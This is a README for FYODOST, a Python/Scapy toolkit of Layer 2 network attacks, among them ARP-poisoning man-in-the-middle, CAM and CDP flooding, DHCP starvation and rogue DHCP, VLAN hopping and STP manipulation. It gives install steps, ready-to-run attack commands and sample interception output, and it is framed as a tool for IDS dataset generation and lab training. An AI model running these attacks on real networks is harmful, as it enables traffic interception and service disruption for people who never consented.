# FYODOST - Layer 2 Attack Research Toolkit

![Python](https://img.shields.io/badge/Python-3.6%2B-blue)
![Scapy](https://img.shields.io/badge/Scapy-Network%20Packet%20Manipulation-orange)
![License](https://img.shields.io/badge/License-MIT-green)
![Platform](https://img.shields.io/badge/Platform-Linux-lightgrey)
![Research](https://img.shields.io/badge/Purpose-Offensive%20Redteam-red)



![Fyodost Icon](./Fyodost_icon.png)
Fyodost — Your all-in-one Layer 2 offensive arsenal, complete control over the Layer 2 battlefield.

## 🚀 Features

### 🔥 Attack Modules
- **CAM Table Flooding** - Switch CAM table exhaustion attacks
- **ARP Poisoning** - Man-in-the-middle attacks with PCAP capture
- **DHCP Starvation** - Exhaust DHCP server IP pools
- **DHCP Spoofing** - Rogue DHCP server implementation
- **CDP Flood** - Cisco Discovery Protocol flooding
- **LLDP Attacks** - Link Layer Discovery Protocol manipulation
- **VLAN Hopping** - VLAN security bypass techniques
- **Double VLAN Tagging** - 802.1Q QoS bypass attacks
- **MAC Spoofing** - MAC address impersonation
- **STP/MSTP Attacks** - Spanning Tree Protocol manipulation
- **PVLAN Attacks** - Private VLAN security bypass
- **Switch Spoofing** - Network device impersonation
- **Data Link Impersonation** - Comprehensive CAM poisoning attacks

### 🛠️ Technical Features
- **Unified CLI Interface** - Consistent command structure for all attacks
- **PCAP Capture** - Built-in packet capture for traffic analysis
- **Network Scanning** - Automatic device discovery and targeting
- **Vendor-specific MACs** - Realistic Cisco device impersonation
- **Research-grade** - Designed for IDS dataset generation
- **Modular Architecture** - Easy to extend with new attack modules

## 📦 Installation

### Prerequisites
- Python 3.6+
- Linux operating system
- Root privileges (for raw socket access)
- Network interface with promiscuous mode support

### Quick Install
```bash
# Clone the repository
git clone https://github.com/aahmadnejad/fyodost.git
cd fyodost

# Install dependencies
pip install -r requirements.txt

# Install the package
sudo pip install -e .
```

### Dependencies
```bash
# Core dependencies
pip install scapy netifaces prettytable

# Or install from requirements.txt
pip install -r requirements.txt
```

## 🎯 Usage

### Basic Commands
```bash
# List all available attacks
sudo fyodost --list-attacks

# Scan network devices
sudo fyodost --scan --interface eth0

# Show help information
fyodost --help
```

### Attack Examples
```bash
# ARP Poisoning with PCAP capture
sudo fyodost --attack arp_poisoning --interface eth0 \
    --target-ip 192.168.1.100 --gateway-ip 192.168.1.1 --pcap

# CDP Flood attack
sudo fyodost --attack cdp_flood --interface eth0 --count 2000 --interval 0.05

# DHCP Starvation
sudo fyodost --attack dhcp_starvation --interface eth0 --persistent

# MAC Spoofing with Cisco OUI
sudo fyodost --attack mac_spoofing --interface eth0 --vendor cisco --count 500

# VLAN Hopping attack
sudo fyodost --attack vlan_hopping --interface eth0 --vlans 10,20,30 --count 50
```

### Advanced Usage
```bash
# Custom PCAP output path
sudo fyodost --attack arp_poisoning --interface eth0 \
    --target-ip 192.168.1.100 --gateway-ip 192.168.1.1 \
    --pcap /path/to/capture.pcap

# Attack with specific duration
sudo fyodost --attack dhcp_spoofing --interface eth0 --duration 600

# Verbose output mode
sudo fyodost --attack cam_flood --interface eth0 --count 10000 --verbose
```

## 🏗️ Project Structure

```
fyodost/
├── fyodost/
│   ├── main.py              # Main CLI interface
│   ├── attacks/             # Attack modules
│   │   ├── arp_poisoning.py
│   │   ├── cam_flood.py
│   │   ├── cdp_flood.py
│   │   ├── dhcp_spoofing.py
│   │   ├── dhcp_starvation.py
│   │   ├── double_vlan.py
│   │   ├── impersonation.py
│   │   ├── lldp_attack.py
│   │   ├── mac_spoofing.py
│   │   ├── mstp_attack.py
│   │   ├── pvlan_attack.py
│   │   ├── stp_attack.py
│   │   ├── switch_spoofing.py
│   │   └── vlan_hopping.py
│   └── utils/
│       ├── helpers.py       # Network utilities
│       └── quotes.py        # Motivational quotes
├── setup.py                 # Package installation
├── requirements.txt         # Python dependencies
└── README.md               # This file
```

## 🔬 Research Applications

FYODOST is specifically designed for:
- **IDS Dataset Generation** - Create comprehensive datasets for training intrusion detection systems
- **Network Security Research** - Study Layer 2 attack vectors and defense mechanisms
- **Academic Projects** - MSc/PhD research in network security
- **Penetration Testing Training** - Educational purposes in controlled environments
- **Network Protocol Analysis** - Deep analysis of Layer 2 protocol vulnerabilities

## ⚠️ Disclaimer

**IMPORTANT: This tool is for academic and research purposes only.**

- 🚫 **Do not use on networks without explicit permission**
- 🚫 **Not for malicious or unauthorized activities**
- 🚫 **Use only in controlled lab environments**
- 🚫 **The authors are not responsible for misuse**

```python
# Ethical use reminder
print("Use responsibly: For research and education only!")
```

## 📊 Output Examples

### Network Scan Output
```
Devices on network (Interface: eth0):

+-------------+-------------------+---------------------+------+
| IP Address  | MAC Address       | Vendor              | Self |
+-------------+-------------------+---------------------+------+
| 192.168.1.1 | aa:bb:cc:dd:ee:ff | TP-Link             |      |
| 192.168.1.2 | 11:22:33:44:55:66 | Samsung Electronics |      |
| 192.168.1.5 | 00:1a:2b:3c:4d:5e | Apple               |      |
| 192.168.1.10| 66:77:88:99:aa:bb | Unknown             |      |
| 192.168.1.50| 12:34:56:78:90:ab | Cisco               |      |
| 192.168.1.100| a1:b2:c3:d4:e5:f6 | Microsoft           | ✓    |
+-------------+-------------------+---------------------+------+

Total devices found: 6
```

### Attack Execution Output
```
[+] Executing ARP Poisoning attack
[+] Interface: eth0
[+] Target IP: 192.168.1.100
[+] Gateway IP: 192.168.1.1
[+] PCAP capture enabled: /home/user/Fyodost/arp_poisoning.pcap
--------------------------------------------------
[ARP Poisoning] Starting MITM attack between 192.168.1.100 and 192.168.1.1
[ARP Poisoning] Target MAC: aa:bb:cc:dd:ee:ff
[ARP Poisoning] Gateway MAC: 11:22:33:44:55:66
[INTERCEPTED #1] 192.168.1.100 -> 192.168.1.1 (TCP) 54321 -> 80
```

## 🤝 Contributing

We welcome contributions to FYODOST! Please see our [Contributing Guidelines](CONTRIBUTING.md) for details.

### Development Setup
```bash
# Fork and clone the repository
git clone https://github.com/aahmadejad/fyodost.git
cd fyodost

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install development dependencies
pip install -r requirements.txt
pip install -e .

# Run tests
python -m pytest tests/
```

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgments

- **Scapy** team for the excellent packet manipulation library
- **Network security researchers** worldwide
- **Academic community** for supporting open security research
- **Contributors** who help improve this toolkit

## 📚 References

- Layer 2 Security Protocols (IEEE 802.1X, 802.1Q)
- Cisco Network Security Architecture
- ARP Spoofing and MITM Attack Techniques
- DHCP Security Considerations (RFC 2131, 3118)
- VLAN Security Best Practices

## 🐛 Bug Reports

Found a bug? Please open an issue on our [GitHub Issues](https://github.com/yourusername/fyodost/issues) page.

## 💡 Future Development

- [ ] IPv6 support for all attacks
- [ ] Wireless (802.11) attack modules
- [ ] Web-based management interface
- [ ] Automated attack scenarios
- [ ] Enhanced PCAP analysis tools
- [ ] Machine learning integration for attack detection

---

**FYODOST** - Empowering network security research through comprehensive Layer 2 attack.

*Remember: With great power comes great responsibility. Use this tool ethically and legally.*